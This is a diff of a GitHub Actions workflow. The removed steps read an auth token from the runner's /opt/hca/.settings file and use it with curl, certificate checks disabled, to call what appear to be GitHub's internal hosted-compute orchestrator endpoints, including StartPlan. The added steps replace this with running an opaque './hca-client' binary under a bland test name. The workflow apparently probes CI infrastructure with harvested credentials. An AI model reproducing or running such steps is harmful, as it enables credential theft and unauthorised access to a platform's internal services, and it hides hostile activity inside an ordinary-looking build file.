@@ -1,4 +1,4 @@
-name: Final API Call
+name: HCA Client Test
 on:
   push:
     branches: [master]
@@ -7,36 +7,9 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: One-liner API test
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run HCA client
         run: |
-          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          API="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com"
-          
-          echo "=== /v1/ ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --connect-timeout 5 \
-              -H 'Authorization: Bearer $TOK' \
-              '$API/v1/'
-          " 2>&1
-          
-          echo ""
-          echo "=== Twirp GetPlanStatus ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --http2 --connect-timeout 5 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\"}' \
-              '$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
-          
-          echo ""
-          echo "=== Twirp StartPlan ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --http2 --connect-timeout 5 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\",\"workflowTemplate\":\"test\"}' \
-              '$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
-          " 2>&1
-          
-          echo "=== DONE ==="
+          chmod +x ./hca-client
+          ./hca-client 2>&1
